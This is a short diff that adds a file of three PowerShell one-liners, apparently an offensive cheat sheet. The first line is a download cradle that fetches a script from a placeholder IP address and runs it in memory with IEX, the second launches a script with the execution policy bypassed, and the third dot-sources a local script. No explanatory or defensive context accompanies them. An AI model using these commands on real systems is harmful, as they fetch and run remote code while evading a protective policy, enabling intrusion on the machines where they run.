@@ -1,0 +1,6 @@
+IEX (New-Object Net.WebClient).DownloadString(“http://<ip_address>/full_path/script_name.ps1”)
+
+powershell -ExecutionPolicy Bypass file.ps1
+
+. .\file.ps1
+
